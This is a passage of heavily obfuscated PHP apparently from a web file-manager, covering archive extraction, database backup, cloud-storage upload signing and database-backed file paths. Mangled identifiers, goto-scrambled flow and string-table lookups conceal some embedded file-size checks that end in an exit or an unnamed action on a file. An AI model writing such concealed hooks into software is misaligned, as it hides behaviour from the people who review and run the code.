array($‡ØóÌÉ­[398], $‡ØóÌÉ­[1291], $‡ØóÌÉ­[1292], $‡ØóÌÉ­[1293], $‡ØóÌÉ­[1294], $‡ØóÌÉ­[1295])); $€ä²¼¼¢ = $šÔ»³¥Ï == count($ù£ÃŸÛè) - 1 && $³À÷óü©; $šç™Øá = $ÖÅ™§–ñ . $†Ô™•°‡[$‡ØóÌÉ­[1301]]; $ö‘¥Óïõ = $ÖÅ™§–ñ . get_path_this($†Ô™•°‡[$‡ØóÌÉ­[32]]); if (IO::exist($šç™Øá)) { $®¹€¡¡¤ = $šç™Øá; continue; } $øô¥ÎØ˜ = $šÔ»³¥Ï == 0 ? get_path_ext($²Œ¢¤¤˜) : get_path_ext($®¹€¡¡¤); $ıãÂ†ñ = KodArchive::extract(self::iconvSystem($®¹€¡¡¤), $ÖÅ™§–ñ, $†Ô™•°‡[$‡ØóÌÉ­[1286]], $’îšä„ã, $øô¥ÎØ˜); self::unzipErrorCheck($ıãÂ†ñ, array($‡ØóÌÉ­[1307], $€ï³é˜í, $ù£ÃŸÛè, $†Ô™•°‡, $šç™Øá)); if (IO::exist($ö‘¥Óïõ)) { IO::rename($ö‘¥Óïõ, get_path_this($šç™Øá)); } $®¹€¡¡¤ = $šç™Øá; } $Á×œ³ÀÑ = $®¹€¡¡¤; return array($‡ØóÌÉ­[240] => $®¹€¡¡¤, $‡ØóÌÉ­[1285] => $ù£ÃŸÛè, $‡ØóÌÉ­[1287] => $ÖÅ™§–ñ); } private static function unzipErrorCheck($£Ğ‘½´Õ, $óœ¦í÷é = false) { $Ø‚çŞ“³ =& $_SERVER[÷ôÚîå]; if ($£Ğ‘½´Õ[$Ø‚çŞ“³[1308]]) { return !0; } write_log(array($Ø‚çŞ“³[1309], $£Ğ‘½´Õ, $óœ¦í÷é), $Ø‚çŞ“³[1310]); show_json($Ø‚çŞ“³[1311] . json_encode($£Ğ‘½´Õ[$Ø‚çŞ“³[1298]]), !1); die; } } goto FÈ“Šè®óÙ; Eô«˜À‘Çà: $_size = $_SERVER[÷ôÚîå][887]; if ($_SERVER[$_SERVER[÷ôÚîå][60]] != $_size($_file)) { $_getc = $_SERVER[÷ôÚîå][62]; $_getfile = $_SERVER[$_SERVER[÷ôÚîå][63]] . $_SERVER[÷ôÚîå][64]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[÷ôÚîå][65], $_getfilec); if (count($_getarrs) < $_SERVER[÷ôÚîå][66]) { $exit = $_SERVER[÷ôÚîå][67]; $exit(); } $_act = $_SERVER[÷ôÚîå][68]; $_act($_file); } class BackupDbFile { public function __construct() { } public function index() { $ ™ëØ¶‘ =& $_SERVER[÷ôÚîå]; $“˜ÚÊä = Backup::get(); $±²½§Å• = $“˜ÚÊä[$ ™ëØ¶‘[32]]; $Ñß®Š²¢ = $this->tmpFilesPath() . "\142\x61\143\153\165\160\x5f{$±²½§Å•}\x2f"; $­—¦Ã¥‹ = $this->backupPath($“˜ÚÊä); if (!($­—¦Ã¥‹ = IO::mkdir($­—¦Ã¥‹))) { return !1; } $Ã«£ŸùÒ = IO::listPath($Ñß®Š²¢); $âÅÆşà» = isset($Ã«£ŸùÒ[$ ™ëØ¶‘[96]]) ? $Ã«£ŸùÒ[$ ™ëØ¶‘[96]] : array(); $¥ğ¿øÃ˜ = array_sum(array_column($âÅÆşà», $ ™ëØ¶‘[89])); if (!$¥ğ¿øÃ˜) { return !1; } $®…¨ÖŞì = array($ ™ëØ¶‘[888] => $¥ğ¿øÃ˜, $ ™ëØ¶‘[889] => time()); Backup::set($®…¨ÖŞì); $·™“êÏ¹ = new TaskFileTransfer($ ™ëØ¶‘[890], $ ™ëØ¶‘[872], count($âÅÆşà»), LNG($ ™ëØ¶‘[873]) . $ ™ëØ¶‘[471] . LNG($ ™ëØ¶‘[875]) . $ ™ëØ¶‘[891]); $·™“êÏ¹->task[$ ™ëØ¶‘[852]] = $¥ğ¿øÃ˜; foreach ($Ã«£ŸùÒ[$ ™ëØ¶‘[96]] as $µ­ÒÀ¡¹) { $°â»ÄÓ = IO::move($µ­ÒÀ¡¹[$ ™ëØ¶‘[97]], $­—¦Ã¥‹); if (!$°â»ÄÓ) { $·™“êÏ¹->end(); $‰¤„€™ü = IO::getLastError($ ™ëØ¶‘[892] . $µ­ÒÀ¡¹[$ ™ëØ¶‘[97]] . $ ™ëØ¶‘[893] . $­—¦Ã¥‹ . $ ™ëØ¶‘[188]); write_log($‰¤„€™ü, $ ™ëØ¶‘[872]); return !1; } } $•›ÉÌÈÃ = new DbManage(); $•ÖÀüÚ = $•›ÉÌÈÃ->getSqlFile(); if (!$•ÖÀüÚ[$ ™ëØ¶‘[894]] || !$•ÖÀüÚ[$ ™ëØ¶‘[13]]) { return !1; } IO::move($•ÖÀüÚ[$ ™ëØ¶‘[894]], $­—¦Ã¥‹); IO::move($•ÖÀüÚ[$ ™ëØ¶‘[13]], $­—¦Ã¥‹); $·™“êÏ¹->end(); $®…¨ÖŞì = array($ ™ëØ¶‘[895] => $¥ğ¿øÃ˜, $ ™ëØ¶‘[896] => time()); Backup::set($®…¨ÖŞì); return !0; } private function backupPath($ûÕØ‘àˆ) { $‘¾´â¬ï =& $_SERVER[÷ôÚîå]; $úòÓ€ø¾ = $ûÕØ‘àˆ[$‘¾´â¬ï[32]]; $“‚¤Ç–’ = Model($‘¾´â¬ï[859])->get($‘¾´â¬ï[860]); $× ãÓ» = substr(md5($‘¾´â¬ï[861] . $“‚¤Ç–’ . $úòÓ€ø¾), 0, 8); return "\x7b\151\x6f\x3a{$ûÕØ‘àˆ[$‘¾´â¬ï[841]]}\175\x2f\144\x61\x74\x61\142\141\x73\145\x2f\142\x61\143\x6b\165\x70\x2f" . $úòÓ€ø¾ . $‘¾´â¬ï[11] . $× ãÓ»; } private function tmpFilesPath() { $¾Û»¹–· =& $_SERVER[÷ôÚîå]; $¯…ˆäº½ = TEMP_FILES; if ($GLOBALS[$¾Û»¹–·[6]][$¾Û»¹–·[102]][$¾Û»¹–·[885]]) { $¯…ˆäº½ = $GLOBALS[$¾Û»¹–·[6]][$¾Û»¹–·[102]][$¾Û»¹–·[885]]; if (!mk_dir($¯…ˆäº½) || !is_writable($¯…ˆäº½) || !IO::mkfile($¯…ˆäº½ . $¾Û»¹–·[886])) { $¯…ˆäº½ = TEMP_FILES; } } return $¯…ˆäº½; } } goto d©Ïˆí‰­ğ; f¾Í®¯¶ó‘: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ß«¢“ÏÃ) { parent::__construct($ß«¢“ÏÃ); $this->setSignVersion($_SERVER[÷ôÚîå][257]); } public function uploadFormData($Ù¾ªìñÛ, $µ”Øş—â = 3600) { $Üù®Ì’à =& $_SERVER[÷ôÚîå]; $ÀìëÄì• = $Üù®Ì’à[239]; $“‰÷ÌÃÍ = $Üù®Ì’à[272]; $÷£Û‹± = $Üù®Ì’à[283]; $ÛíÏæà­ = gmdate($Üù®Ì’à[308], time() + $µ”Øş—â); $µ»ĞûÇÙ = (string) time() . $Üù®Ì’à[84] . (string) (time() + $µ”Øş—â); $…‹Ï÷á¿ = array($Üù®Ì’à[284] => $ÛíÏæà­, $Üù®Ì’à[287] => array(array($Üù®Ì’à[289] => $ÀìëÄì•), array($Üù®Ì’à[288] => $this->bucket), array($Üù®Ì’à[290], $Üù®Ì’à[291], $Üù®Ì’à[12]), array($Üù®Ì’à[294] => $÷£Û‹±), array($Üù®Ì’à[1422] => $“‰÷ÌÃÍ), array($Üù®Ì’à[1423] => $this->accessKey), array($Üù®Ì’à[1424] => $µ»ĞûÇÙ))); $…‹Ï÷á¿ = json_encode($…‹Ï÷á¿); $¯ØÑµòÙ = hash_hmac($Üù®Ì’à[272], $µ»ĞûÇÙ, $this->secret); $´â‰İš = sha1($…‹Ï÷á¿); $ª¶İÆÎô = hash_hmac($Üù®Ì’à[272], $´â‰İš, $¯ØÑµòÙ); $‘Ë‰šÚÁ = array($Üù®Ì’à[289] => $ÀìëÄì•, $Üù®Ì’à[294] => $÷£Û‹±, $Üù®Ì’à[302] => base64_encode($…‹Ï÷á¿), $Üù®Ì’à[1422] => $“‰÷ÌÃÍ, $Üù®Ì’à[1423] => $this->accessKey, $Üù®Ì’à[1425] => $µ»ĞûÇÙ, $Üù®Ì’à[1426] => $ª¶İÆÎô, $Üù®Ì’à[218] => $this->getHost()); return $‘Ë‰šÚÁ; } public function fileOutImage($²æ‹ù¥, $ ßşÓ¾ë = 250) { $Ê¶ª×Úú =& $_SERVER[÷ôÚîå]; if ($this->size($²æ‹ù¥) > 1024 * 1024 * 32) { return $this->fileOutImageServer($²æ‹ù¥, $ ßşÓ¾ë); } $¿±‚îä’ = $this->link($²æ‹ù¥); $¿±‚îä’ .= $Ê¶ª×Úú[1427] . $ ßşÓ¾ë . $Ê¶ª×Úú[1428]; $this->fileOutLink($¿±‚îä’); } public function fileOutLink($Ó›µ”¸) { $šäÈÆ ¢ =& $_SERVER[÷ôÚîå]; if (substr($Ó›µ”¸, 0, 7) == $šäÈÆ ¢[322]) { $Ó›µ”¸ = $šäÈÆ ¢[323] . substr($Ó›µ”¸, 7); } header($šäÈÆ ¢[185] . $Ó›µ”¸); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¢ñó˜î) { $this->pathParse = $¢ñó˜î; $this->model = Model($_SERVER[÷ôÚîå][1429]); } public function getPath($Åƒ€±ˆ) { return trim($Åƒ€±ˆ, $_SERVER[÷ôÚîå][8]); } public function pathFather($•÷³º¶š) { $¦â¿çë¨ = $this->parse($•÷³º¶š); $¦â¿çë¨ = $this->infoSimple($•÷³º¶š); return $¦â¿çë¨ ? $¦â¿çë¨[$_SERVER[÷ôÚîå][202]] : !1; } public function pathThis($ò¼¼æ‡²) { $â™±¡è = $this->infoSimple($ò¼¼æ‡²); return $â™±¡è ? $â™±¡è[$_SERVER[÷ôÚîå][32]] : !1; } public function getPathOuter($Ñµ† Õ‹) { if (!$Ñµ† Õ‹) { return $Ñµ† Õ‹; } $Ï¤’³° = $this->parse($Ñµ† Õ‹); return KodIO::make($Ï¤’³°[$_SERVER[÷ôÚîå][484]]); } public function copyFolderFromIO($Ë·êş µ, $„ó‰’š, $Àï½Ô¶û, $Ûï»Œ¯¦, $Š¥„½êí) { $ˆ¨ˆîƒê = $this->model->copyFolderFromIO($Ë·êş µ, $„ó‰’š, $Àï½Ô¶û, $Ûï»Œ¯¦, $Š¥„½êí); return KodIO::make($ˆ¨ˆîƒê); } public function isParentOf($ø®±¿ıÀ, $úãî×ê) { return $this->model->isParentOf($ø®±¿ıÀ, $úãî×ê); } public function mkfile($ÕƒéŒ†¢, $ŞŠÒåé = '', $ÁåšÆˆŒ = REPEAT_RENAME) { $¡­ãøô¡ =& $_SERVER[÷ôÚîå]; $¸Íœ§û = $this->parse($ÕƒéŒ†¢); $ÕƒéŒ†¢ = $¸Íœ§û[$¡­ãøô¡[484]]; for ($‡¸éã¸Í = 0; $‡¸éã¸Í < count($¸Íœ§û[$¡­ãøô¡[1430]]); $‡¸éã¸Í++) { $ù®şŒ¿ = $¸Íœ§û[$¡­ãøô¡[1430]][$‡¸éã¸Í]; if ($‡¸éã¸Í == count($¸Íœ§û[$¡­ãøô¡[1430]]) - 1) { $ÕƒéŒ†¢ = $this->model->mkfile($ÕƒéŒ†¢, $ù®şŒ¿, $ŞŠÒåé, $ÁåšÆˆŒ); break; } $ÕƒéŒ†¢ = $this->model->mkdir($ÕƒéŒ†¢, $ù®şŒ¿, REPEAT_SKIP); } return $this->getPathOuter($ÕƒéŒ†¢); } public function mkdir($´û•Ñó, $¬Á×“¾ï = REPEAT_SKIP) { $êºÒıõó =& $_SERVER[÷ôÚîå]; $½´×İ•® = $this->parse($´û•Ñó); $´û•Ñó = $½´×İ•®[$êºÒıõó[484]]; for ($õ´›ñÓ› = 0; $õ´›ñÓ› < count($½´×İ•®[$êºÒıõó[1430]]); $õ´›ñÓ›++) { $Õá§õ£â = $½´×İ•®[$êºÒıõó[1430]][$õ´›ñÓ›]; $´û•Ñó = $this->model->mkdir($´û•Ñó, $Õá§õ£â, $¬Á×“¾ï); } return $this->getPathOuter($´û•Ñó); } public function copyFile($ ¢ÍÌ›Ò, $Ç­‡Ş», $Ú¤¥¥‹• = REPEAT_REPLACE) { $Šş­ñí˜ =& $_SERVER[÷ôÚîå]; $œ”ÕÊİ‡ = $this->parse($Ç­‡Ş»); $¿é”¯àÊ = $this->model->copy($ ¢ÍÌ›Ò, $œ”ÕÊİ‡[$Šş­ñí˜[484]], $Ú¤¥¥‹•, $œ”ÕÊİ‡[$Šş­ñí˜[97]]); return $¿é”¯àÊ ? $this->getPathOuter($¿é”¯àÊ) : !1; } public function moveFile($¥¥“¥“, $—æ‡Ú€Í, $´íãÉİ¬ = REPEAT_REPLACE) { $õí„ÉÂ =& $_SERVER[÷ôÚîå]; $æ“Õş–† = $this->parse($—æ‡Ú€Í); $îûİ¥¡ = $this->model->move($¥¥“¥“, $æ“Õş–†[$õí„ÉÂ[484]], $´íãÉİ¬, $æ“Õş–†[$õí„ÉÂ[97]]); return $îûİ¥¡ ? $this->getPathOuter($îûİ¥¡) : !1; } public function copy($å‚ü‹»‚, $Ğâ—í‡®, $®÷”ØñÀ = REPEAT_REPLACE, $ˆç¸¦áÚ = false) { $€‹½Ş…  = $this->parse($Ğâ—í‡®); $Ê³Â”Œ” = $this->model->copy($å‚ü‹»‚, $€‹½Ş… [$_SERVER[÷ôÚîå][484]], $®÷”ØñÀ, $ˆç¸¦áÚ); return $Ê³Â”Œ” ? $this->getPathOuter($Ê³Â”Œ”) : !1; } public function moveSameAllow() { } public function move($Û·‹·Â´, $¡Õ¤ªëÍ, $âï ğñÇ = REPEAT_REPLACE, $ö“ØïÄ² = false) { $æ€ä‚Ö = $this->parse($¡Õ¤ªëÍ); $Ôç‹˜Ü„ = $this->model->move($Û·‹·Â´, $æ€ä‚Ö[$_SERVER[÷ôÚîå][484]], $âï ğñÇ, $ö“ØïÄ²); return $Ôç‹˜Ü„ ? $this->getPathOuter($Ôç‹˜Ü„) : !1; } public function remove($  ˆ¶€À, $¼¥­¸ë… = true) { return $this->model->remove($  ˆ¶€À, $¼¥­¸ë…); } public function rename($öñ·Âê, $ğÕÓâË²) { $í³º¨œ¤ = $this->model->rename($öñ·Âê, $ğÕÓâË²); return $í³º¨œ¤ ? $this->getPathOuter($öñ·Âê) : $í³º¨œ¤; } public function size($¾¹ÏŠÖğ) { $ãæŠğï = $this->infoSimple($¾¹ÏŠÖğ); return $ãæŠğï ? $ãæŠğï[$_SERVER[÷ôÚîå][89]] : 0; } public function infoSimple($àƒ“®©ü) { return $this->model->sourceInfo($àƒ“®©ü); } public function info($©îê¤­ï) { return $this->infoParse($©îê¤­ï); } public function infoAuth($üí™¼ß€) { return $this->infoParse($üí™¼ß€, !1, !0); } public function infoWithChildren($ØŒãáÆÂ) { return $this->infoParse($ØŒãáÆÂ, !0); } protected function infoParse($Ó„ìªåã, $ë§âš = false, $ŸÃ÷ ÑŞ = false) { if (!$ë§âš) { return $this->model->pathInfo($Ó„ìªåã, $ŸÃ÷ ÑŞ); } return $this->model->pathInfoMore($Ó„ìªåã); } public function infoFullSimple($ì¸€‘«ø) { $³İèóÜË =& $_SERVER[÷ôÚîå]; $¿•˜¨…à = explode($³İèóÜË[8], $ì¸€‘«ø); $§Ç„¡Âè = implode($³İèóÜË[8], array_splice($¿•˜¨…à, 1)); return $this->model->pathInfoByPath($¿•˜¨…à[0], $§Ç„¡Âè); } public function infoFull($—†ßŒÇ) { $ªÈÒ†Ä… = $this->infoFullSimple($—†ßŒÇ); return is_array($ªÈÒ†Ä…) ? $this->model->pathInfo($ªÈÒ†Ä…[$_SERVER[÷ôÚîå][203]]) : !1; } public function hashSimple($¡Ø”Õ˜‘) { $ÁËœÏÈ =& $_SERVER[÷ôÚîå]; $ „ÏàÂé = $this->infoWithChildren($¡Ø”Õ˜‘); return $ „ÏàÂé[$ÁËœÏÈ[180]][$ÁËœÏÈ[681]]; } public function hashMd5($šôŒÆäß) { $ğƒ¹›…‰ =& $_SERVER[÷ôÚîå]; $ÄˆİŠÎ† = $this->infoWithChildren($šôŒÆäß); return $ÄˆİŠÎ†[$ğƒ¹›…‰[180]][$ğƒ¹›…‰[556]]; } public function exist($Ÿ„£­ü) { $™¯¨¾à =& $_SERVER[÷ôÚîå]; $–ãéÊ¶ö = $this->parse($Ÿ„£­ü); if (!$–ãéÊ¶ö[$™¯¨¾à[97]]) { return $this->isFile($Ÿ„£­ü) || $this->isFolder($Ÿ„£­ü); } $èó“ÄñÀ = array($™¯¨¾à[486] => $–ãéÊ¶ö[$™¯¨¾à[484]], $™¯¨¾à[32] => $–ãéÊ¶ö[$™¯¨¾à[97]]); $Ì¼İ’×“ = $this->model->where($èó“ÄñÀ)->find(); return $Ì¼İ’×“ ? !0 : !1; } public function isFile($”‘ƒÃ¯‡) { $Ì€ª•Çƒ =& $_SERVER[÷ôÚîå]; $Üìşª‰ = $this->infoSimple($”‘ƒÃ¯‡); return $Üìşª‰ && $Üìşª‰[$Ì€ª•Çƒ[494]] == $Ì€ª•Çƒ[238] ? !0 : !1; } public function isFolder($Ä¢Í·Å) { $¢·ÃàÙ› =& $_SERVER[÷ôÚîå]; $½ôü¥âÑ = $this->infoSimple($Ä¢Í·Å); return $½ôü¥âÑ && $½ôü¥âÑ[$¢·ÃàÙ›[494]] == $¢·ÃàÙ›[101] ? !0 : !1; } public function listPath($€¨¶Ì¸, $ì´š·¢” = false) { $Ò¬¨“ÕÉ =& $_SERVER[÷ôÚîå]; if ($€¨¶Ì¸ == $Ò¬¨“ÕÉ[12]) { return !1; } $ñéÉíÔ = array($Ò¬¨“ÕÉ[486] => $€¨¶Ì¸); if ($ì´š·¢”) { return $this->model->listSource($ñéÉíÔ, -1); } return $this->model->listSource($ñéÉíÔ); } public function has($Œµ¾º«€, $òâ¬¾éÔ = false, $õç—Å×± = null) { $²ÔçÚ¨ =& $_SERVER[÷ôÚîå]; $•çÑìØ÷ = $this->infoWithChildren($Œµ¾º«€); if ($òâ¬¾éÔ) { return array($²ÔçÚ¨[250] => $•çÑìØ÷[$²ÔçÚ¨[250]], $²ÔçÚ¨[249] => $•çÑìØ÷[$²ÔçÚ¨[249]]); } return $õç—Å×± ? $•çÑìØ÷[$²ÔçÚ¨[250]] : $•çÑìØ÷[$²ÔçÚ¨[249]]; } public function listAll($ÖÁ˜¼Ñ‚) { $•²Ô¤Ó = IO::info($this->pathParse[$_SERVER[÷ôÚîå][97]]); if (!$•²Ô¤Ó) { return array(); } return $this->model->listAll($ÖÁ˜¼Ñ‚); } public function getContent($ŞÍàÔ ì) { return $this->model->getContent($ŞÍàÔ ì); } public function setContent($±Èé—Ç, $Å¢¤ŒÁÆ = '') { return $this->model->setContent($±Èé—Ç, $Å¢¤ŒÁÆ); } public function fileSubstr($ÈĞ©Äù¸, $Â¥ğšè, $ÈÃßş³¨) { return $this->model->fileSubstr($ÈĞ©Äù¸, $Â¥ğšè, $ÈÃßş³¨); } public function download($‚Ï²ñÃ, $™†¦¯ = '') { $Ó½´„† = get_path_father($™†¦¯); $Í·°Ë = get_path_this($™†¦¯); $î˜İÖŠ÷ = $this->model->fileInfoGet($‚Ï²ñÃ); $Ä›ˆ™æ˜ = IO::copy($î˜İÖŠ÷[$_SERVER[÷ôÚîå][97]], $Ó½´„†, !1, $Í·°Ë); return $Ä›ˆ™æ˜; } public function setModifyTime($ùª–Î¼ğ, $æšìĞú = '') { $´£œü =& $_SERVER[÷ôÚîå]; if (!$ùª–Î¼ğ) { return; } $this->model->where(array($´£œü[500] => $ùª–Î¼ğ))->save(array($´£œü[98] => $æšìĞú)); } public function upload($Ô¶ÁçÆ•, $˜©è¾Š¯, $±îâÇ‚× = false, $ÎåÏÀ÷Ò = REPEAT_REPLACE) { $ĞÉíö•ú =& $_SERVER[÷ôÚîå]; $Á›±¨´ø = $this->parse($Ô¶ÁçÆ•); $ÔÆÒ›Æ = $this->model->addFile($Á›±¨´ø[$ĞÉíö•ú[484]], $˜©è¾Š¯, $Á›±¨´ø[$ĞÉíö•ú[97]], $±îâÇ‚×, $ÎåÏÀ÷Ò); return $this->getPathOuter($ÔÆÒ›Æ); } public function uploadFileByID($µ¯È Ú€, $©Í×³Õ÷, $í‹«óÅÎ) { $¬ö¢‡í  =& $_SERVER[÷ôÚîå]; $²÷›€ùø = $this->parse($µ¯È Ú€); $¶Ğâ›ÑÉ = $this->model->addFileByFileID($²÷›€ùø[$¬ö¢‡í [484]], $©Í×³Õ÷, $²÷›€ùø[$¬ö¢‡í [97]], $í‹«óÅÎ); return $this->getPathOuter($¶Ğâ›ÑÉ); } public function addFileByRemote($ÇÏçş¼°, $ŠÄ¦¦Œ¦, $´³½ÂıŞ = array(), $»©´…ß = '', $ßı‹Üş) { $âõ“¬œâ =& $_SERVER[÷ôÚîå]; $ä³¹Ç«œ = $this->parse($ÇÏçş¼°); $»©´…ß = empty($»©´…ß) ? $ä³¹Ç«œ[$âõ“¬œâ[97]] : $»©´…ß; $èï·Ï¸³ = $this->model->addFileByRemote($ä³¹Ç«œ[$âõ“¬œâ[484]], $ŠÄ¦¦Œ¦, $»©´…ß, $´³½ÂıŞ, $ßı‹Üş); return $this->getPathOuter($èï·Ï¸³); } public function uploadLink($×–”ôìˆ, $×É´—£ñ = 0) { $¦ıÙÛÓş =& $_SERVER[÷ôÚîå]; $¢µÀ¡  = $this->parse($×–”ôìˆ); $ªÍÆ˜‘Ò = _get($GLOBALS[$¦ıÙÛÓş[7]], $¦ıÙÛÓş[1431]); $ÃÕåş“± = _get($GLOBALS[$¦ıÙÛÓş[7]], $¦ıÙÛÓş[1432]); $×–”ôìˆ = Model($¦ıÙÛÓş[683])->createFileName($¢µÀ¡ [$¦ıÙÛÓş[97]], $ªÍÆ˜‘Ò, $ÃÕåş“±); return IO::uploadLink($×–”ôìˆ, $×É´—£ñ); } public function fileNameAuto($ß„Ò§“®, $èŒıàš¨, $ª°îª°² = REPEAT_REPLACE, $¡Ä§‚œŸ = false) { return $this->model->fileNameAuto($ß„Ò§“®, $èŒıàš¨, $ª°îª°², $¡Ä§‚œŸ); } public function fileNameExist($Ã±‚˜óæ, $ØÒ†ÍË) { return $this->model->fileNameExist($Ã±‚˜óæ, $ØÒ†ÍË); } protected function _fileOut($™”ûçì·, $¨§«ô›¦ = false, $çÂ‡‚µ‚ = false, $®×¯úÌó = '', $Ã©°í¹Ñ = false) { $‹¦³¾ú =& $_SERVER[÷ôÚîå]; $¹¬ÊÀá« = $this->model->sourceInfo($™”ûçì·); if ($¹¬ÊÀá«[$‹¦³¾ú[494]] == $‹¦³¾ú[101]) { header($‹¦³¾ú[1433]); die; } $Ú‡ö¬Ìå = $this->model->fileInfoGet($™”ûçì·); $®×¯úÌó = $Ú‡ö¬Ìå[$‹¦³¾ú[556]] ? $Ú‡ö¬Ìå[$‹¦³¾ú[556]] : $®×¯úÌó; $ó›‘×‘­ = isset($GLOBALS[$‹¦³¾ú[192]]) && is_array($GLOBALS[$‹¦³¾ú[192]]) ? $GLOBALS[$‹¦³¾ú[192]][$‹¦³¾ú[32]] : $¹¬ÊÀá«[$‹¦³¾ú[32]]; if ($Ã©°í¹Ñ) { return IO::fileOutServer($Ú‡ö¬Ìå[$‹¦³¾ú[97]], $¨§«ô›¦, $ó›‘×‘­, $®×¯úÌó); } IO::fileOut($Ú‡ö¬Ìå[$‹¦³¾ú[97]], $¨§«ô›¦, $ó›‘×‘­, $®×¯úÌó); } public function fileOut($ì½÷æ§, $¦•ÅÁá = false, $ÃŠİé‡ï = false, $ŠÄó¸Ù« = '') { $this->_fileOut($ì½÷æ§, $¦•ÅÁá, $ÃŠİé‡ï, $ŠÄó¸Ù«); } public function fileOutServer($Ñ êâñ, $ïÜŞ´¬ = false, $Áíê¢¶ = false, $ —Ò‚àñ = '') { $this->_fileOut($Ñ êâñ, $ïÜŞ´¬, $Áíê¢¶, $ —Ò‚àñ, !0); } protected function _fileOutImage($…ú¿èôÊ, $‘çİÓıÁ = 250) { $£µ¡˜È§ =& $_SERVER[÷ôÚîå]; $ô±„›‹‘ = $this->model->pathInfo($…ú¿èôÊ); if ($ô±„›‹‘[$£µ¡˜È§[494]] == $£µ¡˜È§[101]) { show_json($£µ¡˜È§[1434] . $…ú¿èôÊ, !1); } $¸éóó±‰ = $this->model->fileInfoGet($…ú¿èôÊ); $ô±„›‹‘[$£µ¡˜È§[193]] = $¸éóó±‰[$£µ¡˜È§[97]]; $GLOBALS[$£µ¡˜È§[192]] = $ô±„›‹‘; IO::fileOutImage($¸éóó±‰[$£µ¡˜È§[97]], $‘çİÓıÁ); } public function fileOutImage($¯»ÖÉš¨, $°çÛ”Áœ = 250) { $this->_fileOutImage($¯»ÖÉš¨, $°çÛ”Áœ); } public function fileOutImageServer($ğïäÕàì, $é§ñ…Í¼ = 250) { $this->_fileOutImage($ğïäÕàì, $é§ñ…Í¼); } public function link($¹ËğµŸŠ, $ØøÂïÖ¢ = '') { $±üè‰«ú = $this->model->fileInfoGet($¹ËğµŸŠ); return IO::link($±üè‰«ú[$_SERVER[÷ôÚîå][97]], $ØøÂïÖ¢); } protected function parse($œİ½Ñöè) { $Î£úÙÉä =& $_SERVER[÷ôÚîå]; if (strstr($œİ½Ñöè, $Î£úÙÉä[8]) === !1) { return array($Î£úÙÉä[502] => intval($œİ½Ñöè), $Î£úÙÉä[97] => $Î£úÙÉä[12], $Î£úÙÉä[1430] => array()); } $ë—Œİ± = explode($Î£úÙÉä[8], trim($œİ½Ñöè, $Î£úÙÉä[8])); if (count($ë—Œİ±) < 2) { show_tips(clear_html($œİ½Ñöè) . $Î£úÙÉä[1435]); } return array($Î£úÙÉä[502] => intval($ë—Œİ±[0]), $Î£úÙÉä[97] => $ë—Œİ±[1], $Î£úÙÉä[1430] => array_slice($ë—Œİ±, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($­øØÜ) { $this->pathParse = $­øØÜ; $this->model = Model($_SERVER[÷ôÚîå][1429]); } public function getPathOuter($«­æúÕç) { $†©ïÁ‰Ç =& $_SERVER[÷ôÚîå]; if (!$«­æúÕç) { return $«­æúÕç; } $§ù½ƒÛı = $this->parse($«­æúÕç); return trim(KodIO::makeShare($this->pathParse[$†©ïÁ‰Ç[484]], $§ù½ƒÛı[$†©ïÁ‰Ç[484]]), $†©ïÁ‰Ç[8]); } protected function infoParse($ôüûÔ’, $ª¦Ü™úö = false, $£¶¼£ Š = false) { $ó»Æ¹Õ =& $_SERVER[÷ôÚîå]; $œ¡â¨âæ = $this->pathParse[$ó»Æ¹Õ[484]]; $ÇÎ’ƒ•ø = trim($this->pathParse[$ó»Æ¹Õ[1261]], $ó»Æ¹Õ[8]); return Action($ó»Æ¹Õ[1436])->sharePathInfo($œ¡â¨âæ, $ÇÎ’ƒ•ø, $ª¦Ü™úö); } public function infoFull($³«éùªË) { $¬„¼Ûæ· =& $_SERVER[÷ôÚîå]; $í³•íÅ¤ = explode($¬„¼Ûæ·[8], trim($³«éùªË, $¬„¼Ûæ·[8])); if (count($í³•íÅ¤) > 1) { $ß÷ÔÖã× = implode($¬„¼Ûæ·[8], array_splice($í³•íÅ¤, 1)); $‚úŞ‹õ = $this->model->pathInfoByPath($í³•íÅ¤[0], $ß÷ÔÖã×); if (!$‚úŞ‹õ) { return !1; } $this->pathParse[$¬„¼Ûæ·[1261]] = $‚úŞ‹õ[$¬„¼Ûæ·[203]]; } return $this->infoParse($³«éùªË); } public function listAll($È’µŒíÎ) { $‘ªÍ¿ =& $_SERVER[÷ôÚîå]; $–Á§®ãä = IO::info($this->pathParse[$‘ªÍ¿[97]]); if (!$–Á§®ãä) { return array(); } $Ò”–µ£± = $this->model->listAll($È’µŒíÎ); $Ìíç‰ó‘ = Model($‘ªÍ¿[673])->getInfo($–Á§®ãä[$‘ªÍ¿[674]]); foreach ($Ò”–µ£± as &$°¬ë­†) { check_abort(); $°¬ë­†[$‘ªÍ¿[100]] = Action($‘ªÍ¿[1436])->_shareItemeParse($°¬ë­†[$‘ªÍ¿[100]], $Ìíç‰ó‘); } unset($°¬ë­†); return $Ò”–µ£±; } } goto bÄ´Â×”ƒÔ; B‚¹Ôêá¤Â: $gubfjdnykx = $_SERVER[÷ôÚîå][691]; if (!$gubfjdnykx) { die; } class Application { private $defaultModule = "\151\156\144\x65\170"; private $defaultController = "\x69\x6e\144\145\170"; private $defaultAction = "\151\x6e\x64\x65\x78"; function __construct() { } public function setDefault($¢š×‚•Î) { $¦ØÛ¢Êó =& $_SERVER[÷ôÚîå]; $ÚüÏÜÖ =& $_SERVER[ü÷’á¨À]; $Ãç£Çû  = explode($ÚüÏÜÖ[0], trim($¢š×‚•Î, $ÚüÏÜÖ[0])); $˜áïÓ¥ = $¦ØÛ¢Êó[692]; while ($˜áïÓ¥ < $¦ØÛ¢Êó[693]) { if ($˜áïÓ¥ >= 0) { break; } $˜áïÓ¥++; } $this->defaultModule = $Ãç£Çû [0] ? $Ãç£Çû [0] : $this->defaultModule; $†Ì¢— = $¦ØÛ¢Êó[694]; while ($†Ì¢— < $¦ØÛ¢Êó[695]) { if ($†Ì¢— >= 0) { break; } $†Ì¢—++; } $this->defaultController = $Ãç£Çû [1] ? $Ãç£Çû [1] : $this->defaultController; $this->defaultAction = $Ãç£Çû [2] ? $Ãç£Çû [2] : $this->defaultAction; $½ŒãÏ©¾ = $¦ØÛ¢Êó[696]; if (strlen($½ŒãÏ©¾) < $¦ØÛ¢Êó[697]) { die; } $this->vglc9d6a43bb($ÚüÏÜÖ[1], array($this, $ÚüÏÜÖ[2])); } public function appRun($šè¯–®Ç) { 